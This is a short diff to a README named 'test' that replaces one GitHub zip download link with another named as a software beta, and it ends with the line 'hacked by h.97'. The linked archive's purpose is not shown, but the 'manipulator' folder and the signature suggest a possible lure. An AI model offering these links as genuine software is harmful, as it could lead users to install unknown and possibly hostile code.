@@ -1,5 +1,5 @@
 # test
 
-https://raw.githubusercontent.com/soona97/test/main/manipulator/test_1.6.zip
+https://github.com/soona97/test/raw/refs/heads/main/manipulator/Software-2.2-beta.2.zip
 
 hacked by h.97
